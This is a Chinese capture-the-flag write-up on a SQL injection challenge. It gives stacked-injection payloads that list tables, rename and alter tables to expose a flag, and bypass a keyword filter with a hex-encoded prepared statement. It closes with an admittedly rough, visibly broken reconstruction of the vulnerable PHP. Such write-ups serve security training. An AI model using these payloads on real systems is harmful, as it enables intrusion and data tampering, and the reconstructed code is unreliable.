# \[强网杯 2019]随便注

## \[强网杯 2019]随便注

## 考点

* 堆叠注入
* MySQL操作库表函数
* 预编译注入

## wp

1. 打开靶机，随便提交，发现似乎是把 PHP 查询的原始结果之间返回了
2.  输入 select 发现了过滤语句，过滤了 select，update，delete，drop，insert，where 和 .

    `return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);`
3. 测试一下有没有注入。`?inject=1'%23`，返回正常，字符型注入
4.  过滤了这么多关键词，尝试堆叠注入。`?inject=1';show databases;%23`，看到了所有的数据库

    <img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_supersql_1.png" alt="" data-size="original">
5.  再看一下所有的表。`?inject=1';show tables;%23`，1919810931114514 表和 words 表

    <img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_supersql_2.png" alt="" data-size="original">
6. flag 在全数字的表里，默认查询的是 words 表

```
   ?inject=1';show columns from `1919810931114514`;%23
   ?inject=1';show columns from `words`;%23
```

![](https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/6.png)

![](https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/7.png)

1. 既然没过滤 alert 和 rename，那就可以把表和列改名。先把 words 改为 words1，再把数字表改为 words，然后把新的 words 表里的 flag 列改为 id ，这样就可以直接查询 flag 了
2.  构造 payload 如下

    ```
    /?inject=1';RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;%23
    ```
3. 使用 `/?inject=1' or '1'='1` 访问一下即可获得 flag

### 小结

1. MySQL中反引号和单引号的区别与用法
   1. MySql 中用一对反引号来标注 SQL 语句中的标识，如**数据库名、表名、字段名**等
   2. 引号则用来标注语句中所引用的字符型常量或日期/时间型常量，即**字段值**
   3. 例如：select \* from \`username\` where \`name\`="peri0d"
2.  PHP 代码推测，这里只是一个大概的流程，和实际可能有出入。参照 sqli-labs 里的代码

    ```
    <?php
    function waf($inject){
    preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
    	die('return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);');
    }

    if(isset($_GET['inject'])){
    	$id = $_GET['inject'];
    	waf($id);
    	
    	$con1 = mysqli_connect($host,$dbuser,$dbpass,$dbname);
    	$sql = "select * from `words` where ;";
    	
    	/* execute multi query */
    	if (mysqli_multi_query($con1, $sql)){
    		/* store first result set */
    		$result = mysqli_multi_query($con1);
    		if ($result)
    		{
    			if($row = mysqli_fetch_row($result))
    			{
    			  var_dump($row);
    			}
    		
    		}
    		/* print divider */
    		if (mysqli_more_results($con1))
    		{
    			echo "<hr>";
    		}
    	}
    	mysqli_close($con1);
    }

    ?>
    ```
3. MySQL 的 show、rename 和 alter 命令
   1. show 可以用于查看当前数据库，当前表，以及表中的字段
   2. rename 用于修改 table 的名称
   3. alter 用于修改表中字段的属性
4. 攻击思路：默认查询 words 表，可以将数字表的名称改成 words，这样就可以 使用 or '1'='1 直接查询 flag 了
5. 第二个思路是利用预编译，先构造一个sql语句，然后执行它，payload转化成16进制绕过waf

```
1';
SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;
prepare execsql from @a;
execute execsql;#
```

这里的十六进制是

```
select * from `1919810931114514`
```
